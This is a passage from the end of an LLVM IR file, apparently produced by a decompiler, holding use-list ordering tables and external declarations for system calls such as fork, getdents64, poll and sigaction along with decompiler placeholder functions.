473, 834, 474, 409, 835, 836, 294, 295, 475, 410, 139, 293, 476, 296, 140, 477, 837, 838, 839, 840, 841, 21, 478, 479, 297, 424, 60, 298, 893, 894, 895, 92, 896, 897, 898, 899, 85, 210, 141, 142, 480, 901, 902, 481, 666, 667, 903, 904, 661, 299, 739, 740, 300, 662, 663, 301, 671, 672, 683, 905, 143, 482, 906, 98, 908, 483, 240, 484, 909, 910, 144, 911, 912, 913, 914, 915, 916, 917, 918, 919, 241, 242, 920, 485, 921, 147, 302, 0, 842, 843, 411, 145, 146, 844, 486, 845, 846, 847, 848, 303, 849, 850, 851, 852, 853, 148, 872, 22, 873, 874, 875, 23, 61, 923, 93, 24, 62, 25, 924, 63, 304, 86, 243, 244, 907, 149, 150, 925, 64, 926, 927, 928, 305, 245, 929, 151, 152, 930, 932, 931, 211, 487, 246, 933, 935, 934, 212, 488, 936, 937, 938, 939, 214, 941, 940, 213, 942, 943, 306, 307, 154, 155, 153, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 489, 957, 156, 958, 490, 960, 158, 157, 961, 962, 491, 94, 95, 963, 964, 965, 970, 971, 966, 967, 968, 969, 492, 972, 973, 974, 975, 247, 978, 979, 493, 980, 1007, 1008, 1009, 668, 669, 494, 308, 670, 673, 679, 680, 495, 496, 681, 159, 160, 674, 675, 676, 677, 678, 682, 1010, 1011, 981, 684, 982, 983, 984, 8, 985, 685, 686, 1012, 248, 865, 693, 1023, 1024, 11, 26, 67, 27, 66, 65, 1025, 497, 1028, 1030, 215, 1031, 309, 498, 1029, 310, 311, 1026, 1013, 161, 1014, 1015, 162, 1016, 1, 2, 163, 515, 516, 517, 68, 518, 499, 312, 313, 421, 1017, 1018, 425, 314, 315, 70, 1019, 500, 1020, 69, 501, 1021, 412, 1022, 771, 772, 773, 774, 164, 502, 79, 775, 278, 503, 249, 165, 166, 504, 687, 505, 688, 167, 506, 168, 507, 854, 71, 855, 856, 3, 508, 316, 689, 4, 690, 250, 169, 317, 509, 170, 988, 989, 990, 991, 992, 251, 993, 994, 995, 318, 986, 9, 319, 987, 320, 171, 172, 510, 511, 321, 413, 512, 322, 414, 100, 173, 513, 996, 997, 174, 175, 323, 415, 252, 998, 999, 1000, 176, 177, 324, 416, 99, 1001, 216, 1002, 88, 1003, 1004, 1006, 514, 1005, 5, 691, 6, 694, 695, 696, 697, 417, 876, 253, 101, 976, 977, 28, 959, 900, 692, 1027, 922, 698, 866, 178, 860, 699, 700, 200, 701, 702, 201, 219, 179, 180, 254, 325, 181, 102, 426, 703, 182, 255, 704, 705, 326, 418, 706, 327, 419, 183, 707, 420, 708, 256, 709, 279, 710, 711, 712, 184, 29, 257, 30, 31, 713, 714, 328, 715, 717, 329, 330, 716, 72, 718, 719, 224, 332, 185, 331, 186, 857, 858, 859, 258, 427, 333, 861, 187, 188, 189, 190, 259, 862, 191, 192, 262, 863, 193, 864, 194, 867, 868, 869, 428, 263, 195, 196, 265, 870, 197, 264, 871, 260, 266, 32, 877, 878, 879, 334, 335, 889, 33, 34, 77, 35, 269, 270, 880, 881, 882, 883, 217, 267, 268, 271, 884, 885, 886, 887, 36, 37, 73, 888, 280, 38, 39, 890, 74, 40, 41, 75, 336, 337, 7, 891, 198, 519, 218, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039 }
  uselistorder i32* @ebx, { 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 248, 249, 60, 61, 62, 11, 63, 64, 65, 12, 66, 13, 67, 68, 69, 70, 14, 71, 72, 73, 74, 75, 76, 77, 78, 79, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 80, 15, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 2, 16, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 0, 110, 111, 112, 113, 114, 115, 116, 117, 118, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 17, 140, 141, 142, 143, 144, 45, 46, 47, 48, 119, 121, 120, 3, 122, 123, 145, 146, 147, 153, 154, 268, 18, 269, 270, 271, 366, 367, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 293, 294, 295, 296, 297, 298, 299, 300, 301, 306, 304, 305, 302, 303, 307, 308, 38, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 148, 149, 150, 151, 152, 334, 336, 337, 7, 8, 6, 335, 4, 5, 338, 368, 19, 369, 370, 371, 20, 372, 373, 374, 375, 376, 377, 378, 379, 380, 21, 381, 382, 385, 386, 387, 388, 389, 390, 155, 156, 157, 158, 159, 160, 161, 162, 391, 392, 393, 394, 395, 175, 22, 176, 177, 178, 179, 195, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 23, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 339, 340, 341, 342, 343, 39, 344, 234, 235, 427, 428, 429, 430, 236, 237, 238, 239, 240, 241, 242, 243, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 24, 443, 25, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 26, 463, 464, 465, 466, 40, 27, 37, 467, 468, 469, 470, 471, 472, 473, 28, 474, 29, 30, 475, 476, 477, 478, 479, 480, 481, 482, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 1, 499, 500, 502, 501, 503, 504, 505, 506, 507, 9, 508, 509, 510, 31, 511, 512, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 180, 186, 187, 188, 189, 190, 191, 181, 182, 183, 184, 185, 192, 193, 194, 561, 562, 563, 564, 513, 514, 32, 515, 516, 196, 565, 566, 358, 359, 210, 211, 212, 517, 518, 519, 41, 42, 585, 586, 587, 588, 577, 580, 583, 584, 567, 568, 43, 33, 44, 520, 569, 570, 571, 572, 573, 574, 575, 576, 291, 292, 197, 198, 199, 200, 201, 345, 348, 34, 10, 349, 346, 347, 350, 351, 352, 202, 203, 204, 205, 206, 207, 521, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 35, 536, 537, 538, 539, 522, 523, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 36, 555, 556, 557, 558, 559, 560, 213, 214, 215, 216, 217, 483, 484, 578, 579, 383, 384, 208, 209, 581, 582, 424, 425, 426, 218, 219, 220, 360, 361, 353, 354, 221, 222, 223, 589, 590, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 244, 245, 246, 247, 355, 356, 357, 591, 592, 593, 362, 363, 364, 365 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strlen(i8*) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @stat(i8*, %stat*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i64 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
